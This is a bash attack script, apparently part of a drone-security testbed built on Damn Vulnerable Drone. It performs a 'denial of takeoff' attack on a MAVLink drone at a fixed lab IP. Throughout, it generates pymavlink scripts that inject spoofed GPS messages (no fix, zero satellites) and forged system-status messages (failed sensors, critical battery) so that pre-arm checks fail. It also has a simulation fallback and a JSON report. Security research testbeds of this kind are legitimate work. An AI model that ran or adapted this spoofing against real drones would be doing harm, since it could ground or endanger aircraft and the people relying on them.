#!/bin/bash

# =============================================================================
# DVD Denial of Takeoff Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/denial_of_service/denial_of_takeoff.sh
# 목적: 사전 비행 검사 방해로 이륙 차단
# 기반: Damn Vulnerable Drone Wiki - Denial of Takeoff
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="denial_of_takeoff"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

declare -a ATTACK_COMMANDS=()
declare -a DENIAL_RESULTS=()

print_header() {
    clear
    print_dos_header "Denial of Takeoff Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: GPS glitch & system status corruption${NC}"
    echo -e "${INFO_COLOR}Goal: Prevent drone arming and takeoff${NC}"
    echo ""
}

# Step 1: GPS 글리치 주입
inject_gps_glitch() {
    echo -e "${BLUE}[1/2] GPS Glitch Injection${NC}"
    
    local gps_script="/tmp/gps_glitch_$(date +%s).py"
    
    cat > "$gps_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def inject_gps_glitch(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 불량한 GPS 데이터 전송 (No fix)
            for i in range(10):
                master.mav.gps_raw_int_send(
                    int(time.time() * 1000000),  # time_usec
                    1,                           # fix_type (NO FIX)
                    0,                           # lat
                    0,                           # lon  
                    0,                           # alt
                    1000,                        # eph (high error)
                    1000,                        # epv (high error)
                    0,                           # vel
                    0,                           # cog
                    0                            # satellites_visible
                )
                print(f"[!] Sent bad GPS data - No fix, 0 satellites")
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_gps_glitch()
    
    def simulate_gps_glitch():
        print("[*] Simulating GPS glitch injection")
        
        for i in range(5):
            print("[!] GPS glitch: No fix, 0 satellites, high error")
            time.sleep(1)
        
        print("[+] GPS glitch simulation completed")
    
    if __name__ == "__main__":
        inject_gps_glitch('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    
    for i in range(5):
        print("[!] GPS glitch: No fix, 0 satellites, high error")
        time.sleep(0.5)
    
    print("[+] GPS glitch injection completed")
EOF

    local cmd="python3 $gps_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Injecting GPS glitch data...${NC}"
    echo -e "${GRAY}    Fix type: NO FIX (1)${NC}"
    echo -e "${GRAY}    Satellites: 0${NC}"
    echo -e "${GRAY}    Position error: HIGH${NC}"
    
    python3 "$gps_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..5}; do
            echo -e "${RED}[!] GPS glitch: No fix, 0 satellites${NC}"
            sleep 0.5
        done
    }
    
    DENIAL_RESULTS+=("gps_glitch:injected")
    DENIAL_RESULTS+=("fix_type:no_fix")
    DENIAL_RESULTS+=("satellites:0")
    
    rm -f "$gps_script"
}

# Step 2: 시스템 상태 손상
corrupt_system_status() {
    echo -e "${BLUE}[2/2] System Status Corruption${NC}"
    
    local status_script="/tmp/status_corrupt_$(date +%s).py"
    
    cat > "$status_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def corrupt_system_status(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 시스템 상태 손상 (센서 오류 시뮬레이션)
            for i in range(10):
                # 센서 오류를 나타내는 플래그들
                sensors_present = 0x00000000      # 센서 없음
                sensors_enabled = 0x00000000      # 센서 비활성화
                sensors_health = 0x00000000       # 센서 불량
                
                master.mav.sys_status_send(
                    sensors_present,    # onboard_control_sensors_present
                    sensors_enabled,    # onboard_control_sensors_enabled  
                    sensors_health,     # onboard_control_sensors_health
                    500,               # load (50%)
                    8000,              # voltage_battery (8V - low)
                    -5000,             # current_battery (-5A)
                    10,                # battery_remaining (10%)
                    0,                 # drop_rate_comm
                    0,                 # errors_comm
                    0, 0, 0, 0         # errors_count
                )
                
                print(f"[!] Sent corrupted system status - Sensors failed, low battery")
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_status_corruption()
    
    def simulate_status_corruption():
        print("[*] Simulating system status corruption")
        
        for i in range(5):
            print("[!] System status: Sensors FAILED, Battery LOW")
            time.sleep(1)
        
        print("[+] System status corruption simulation completed")
    
    if __name__ == "__main__":
        corrupt_system_status('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    
    for i in range(5):
        print("[!] System status: Sensors FAILED, Battery LOW")
        time.sleep(0.5)
    
    print("[+] System status corruption completed")
EOF

    local cmd="python3 $status_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Corrupting system status...${NC}"
    echo -e "${GRAY}    Sensors: ALL FAILED${NC}"
    echo -e "${GRAY}    Battery: CRITICAL LOW${NC}"
    echo -e "${GRAY}    Health status: BAD${NC}"
    
    python3 "$status_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..5}; do
            echo -e "${RED}[!] System status: ALL SENSORS FAILED${NC}"
            sleep 0.5
        done
    }
    
    DENIAL_RESULTS+=("system_status:corrupted")
    DENIAL_RESULTS+=("sensors:failed")
    DENIAL_RESULTS+=("battery_status:critical")
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected pre-arm check failures:${NC}"
    echo -e "${GRAY}    • GPS: NO FIX${NC}"
    echo -e "${GRAY}    • Sensors: FAILED${NC}"
    echo -e "${GRAY}    • Battery: CRITICAL${NC}"
    echo -e "${GRAY}    • Result: ARMING DENIED${NC}"
    
    DENIAL_RESULTS+=("prearm_checks:failed")
    DENIAL_RESULTS+=("arming_status:denied")
    DENIAL_RESULTS+=("takeoff_prevention:successful")
    
    rm -f "$status_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "attack_methods": [
    "GPS glitch injection",
    "System status corruption"
  ],
  "injected_faults": {
    "gps_fix_type": "NO_FIX",
    "gps_satellites": 0,
    "sensors_health": "ALL_FAILED",
    "battery_status": "CRITICAL_LOW"
  },
  "denial_results": ["$(IFS='","'; echo "${DENIAL_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_outcome": "Pre-arm checks fail, takeoff denied"
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Denial of Takeoff - $(date) ===" > "$LOG_FILE"
    
    print_header
    inject_gps_glitch
    corrupt_system_status
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Attack Methods: 2 (GPS + System Status)${NC}"
    echo -e "${INFO_COLOR}Expected Result: Takeoff Denied${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Denial of takeoff attack completed${NC}"
    echo -e "${RED}[!] Pre-arm checks should fail - takeoff prevented${NC}"
}

main "$@"